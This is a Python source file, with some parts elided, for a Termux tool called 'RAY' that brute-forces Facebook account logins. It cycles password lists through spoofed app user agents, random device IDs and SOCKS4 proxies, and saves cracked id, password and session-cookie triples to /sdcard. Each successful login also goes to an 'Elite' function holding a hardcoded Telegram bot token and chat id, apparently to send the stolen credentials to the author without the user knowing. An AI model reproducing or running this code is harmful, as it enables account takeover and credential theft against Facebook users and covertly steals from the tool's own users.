...
try:
        ...
        os.system('python ray.py')
except:pass
def Elite(ids,pas,cookie):
    try:
        import requests
        token = "67407584246o65wd-VzaoqU6LR9U"
        chatid = "6553606623"
...
def Elite(ids,pas,cookie):
    try:
        import requests
        token = "7057454710:AAHx1veZS8pWKh9fPZ0pFrk9_gQkSkc0Am0"
        chatid = "6553606623"
...
def es():
      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
           ...
           system('clear');print('System Modification Not Allowed since using RAY');exit()
...
\033[1;36m╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░
\033[1;32m--------------------------------------------------
\033[1;32m[~] Author   : ray
\033[1;32m[~] Facebook : ray
\033[1;32m[~] Tool     : Free
\033[1;32m[~] Version  : 24.4 Morning 
\033[1;32m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def npxind():
                ...
                with tred(max_workers=30) as RAY:     
                        ...
                        for psx in user:
                                ...
                                if mthd in ['1','01']:                                 
                                    RAY.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    RAY.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [RAY-M1] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Vivo;FBBD/Vivo;FBPN/{fbpn};FBDV/V2154A;FBSV/12;nullFBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [RAY-OK] '+ids+' | '+pas+'\033[1;97m')                                        
                                        open('/sdcard/RAY_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RAY_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[RAY-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;91m [RAY-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RAY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/RAYbrand-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
...
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [RAY-M2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])          
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.orca;FBDV/Redmi Note 13;FBSV/13;nullFBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                nip=random.choice(proxsi)
                                proxs= {'http': 'socks4://'+nip}
                                ...
                                if 'session_key' in q:
                                    ...
                                    #    print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
                                        open('/sdcard/RAY_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RAY_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
...
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [RAY-M3] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])          
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Realme;FBBD/Realme;FBPN/com.facebook.orca;FBDV/RMX3372;FBSV/14;nullFBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                nip=random.choice(proxsi)
                                proxs= {'http': 'socks4://'+nip}
                                ...
                                if 'session_key' in q:
                                      ...
                                      #  print(f"\r\r\033[1;32mFBLINK:https://www.facebook.com/"+ids)                              	
                                        print('\r\r\033[1;32m [RAY-OK] '+ids+' | '+pas+'\033[1;97m')
                                     #   print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
                                        open('/sdcard/RAY_m3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RAY_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
...
def rndm1(ids,passlist):
        global loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;32m [RAY-M1] %s|OK-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/en_US;FBCR/Etisalat;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X672;FBSV/12;FBCA/armeabi-v8a:armeabi;FBDM/"+"{density=2.0,width=720,height=1440};FB_FW/1;]"
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [RAY-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ...
                                        open('/sdcard/RAY_R_COOKiE_M1.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/RAY-R-M1-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [RAY-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAY-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        fban = random.choice(["FB4A", "FB5A", "FB6A"])
                        fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
                        ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/en_US;FBCR/Etisalat;FBMF/Realme;FBBD/Realme;FBDV/RMX3142;FBSV/11;FBCA/armeabi-v8a:armeabi;FBDM/"+"{density=2.0,width=720,height=1440};FB_FW/1;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [RAY-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"  
                                        open('/sdcard/RAY_R_COOKiE_M2.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/RAY-R-M2-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        Elite(uid,pas,cookie)
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;91mm [RAY-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAY-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
